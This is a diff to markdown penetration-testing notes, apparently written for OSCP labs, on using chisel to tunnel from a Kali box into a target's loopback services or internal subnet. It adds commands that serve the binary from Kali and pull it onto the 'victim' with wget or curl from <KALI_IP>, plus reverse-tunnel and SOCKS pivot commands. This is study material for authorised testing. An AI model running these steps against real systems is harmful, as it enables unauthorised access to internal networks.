@@ -2,7 +2,11 @@
 
 Fast TCP tunnel over HTTP(S). One Go binary is **both** the server and the client. Use it to reach a service that's only listening on the target's `127.0.0.1` (or to pivot into an internal subnet) from your Kali box.
 
-> **Not installed on Kali by default** (only [[Ligolo]] is on `Defalt`). Grab the static binary from https://github.com/jpillora/chisel/releases (`chisel_*_linux_amd64.gz` → `gunzip` → `chmod +x`) and transfer it to the target like any other tool ([[File_Transfer]]). Same binary name/arch on both ends is fine.
+> **Kali (attacker) side — apt-installed** → `/usr/bin/chisel`, so invoke it as **`chisel`** (it's on `$PATH` — **no `./`**). Install with `sudo apt install chisel` if a box doesn't have it. One Go binary is both server and client.
+>
+> **Target (victim) side — you must transfer a binary to it** (it never has chisel). See [[#Get chisel onto the target first]] below; run it there as `./chisel` from wherever you drop it.
+>
+> **Match version + arch on both ends** — a mismatch makes chisel *refuse* the tunnel. Easiest guarantee for a **linux_amd64** target: copy Kali's own `/usr/bin/chisel` over (don't download a separate release). For a **Windows** target grab `chisel_*_windows_amd64.gz` from https://github.com/jpillora/chisel/releases (`gunzip` → transfer as `chisel.exe`).
 
 ---
 
@@ -18,13 +22,33 @@ Fast TCP tunnel over HTTP(S). One Go binary is **both** the server and the clien
 
 ---
 
+## Get chisel onto the target first
+
+
+**linux_amd64 target — copy Kali's own binary** (guarantees the version matches):
+```bash
+# Kali — serve the binary from a working dir
+cp /usr/bin/chisel .
+python3 -m http.server 80
+```
+```bash
+# Target — pull it and make it executable
+wget http://<KALI_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+# no wget? →  curl http://<KALI_IP>/chisel -o /tmp/chisel && chmod +x /tmp/chisel
+```
+Then run the client from where you dropped it: `cd /tmp && ./chisel client …`.
+
+> Other transfer routes (scp, SMB, `certutil`/PowerShell for Windows `chisel.exe`) are in [[File_Transfer]]. For a **Windows** target you need `chisel.exe` (windows_amd64), not Kali's linux binary.
+
+---
+
 ## Reverse Port-Forward — expose ONE target-loopback port on Kali
 
 The go-to for "there's a service on the target's `127.0.0.1:8080` I need to browse." **Reverse** = the target dials back to Kali, so it works even when you can't connect *into* the target (firewall/NAT).
 
 **Kali — start the server (listener):**
 ```bash
-./chisel server --reverse --port 8081
+chisel server --reverse --port 8081
 ```
 → `--reverse` lets clients request reverse tunnels; `--port 8081` is chisel's own control port (target connects here).
 
@@ -38,6 +62,10 @@ The go-to for "there's a service on the target's `127.0.0.1:8080` I need to brow
 ```
 http://127.0.0.1:8082
 ```
+*For enumerating Headers:*
+```
+  curl -v http://127.0.0.1:8082/
+```
 
 ---
 
@@ -47,7 +75,7 @@ When you need to reach a **range of internal hosts/ports** (not just one) and do
 
 **Kali — server (same as above):**
 ```bash
-./chisel server --reverse --port 8081
+chisel server --reverse --port 8081
 ```
 
 **Target — request a SOCKS tunnel instead of a fixed port:**
@@ -76,7 +104,7 @@ When *you* can already reach the chisel server on the target and want to pull a 
 # target
 ./chisel server --port 8081
 # kali
-./chisel client <TARGET_IP>:8081 8082:127.0.0.1:8080
+chisel client <TARGET_IP>:8081 8082:127.0.0.1:8080
 ```
 → opens 8082 on Kali → target's `127.0.0.1:8080`. In OSCP the **reverse** form above is almost always the right one (target reaches back to you).
 
